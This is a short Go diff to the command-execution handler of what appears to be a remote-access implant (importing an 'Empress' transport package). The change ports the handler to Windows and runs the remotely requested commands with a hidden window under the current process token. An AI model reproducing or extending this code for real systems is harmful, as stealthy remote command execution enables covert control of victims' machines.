@@ -1,14 +1,14 @@
-//go:build !windows
-
 package proc
 
 import (
 	"bytes"
 	"errors"
 	"github.com/pygrum/Empress/transport"
+	"golang.org/x/sys/windows"
 	"os"
 	"os/exec"
 	"strings"
+	"syscall"
 )
 
 func CmdExec(req *transport.Request, response *transport.Response) {
@@ -19,6 +19,10 @@ func CmdExec(req *transport.Request, response *transport.Response) {
 			tokens[i] = os.ExpandEnv(t)
 		}
 		cmd := exec.Command(tokens[0], tokens[1:]...)
+		cmd.SysProcAttr = &syscall.SysProcAttr{
+			HideWindow: true,
+			Token:      syscall.Token(windows.GetCurrentProcessToken()),
+		}
 		var cOut, cErr bytes.Buffer
 		cmd.Stdout = &cOut
 		cmd.Stderr = &cErr
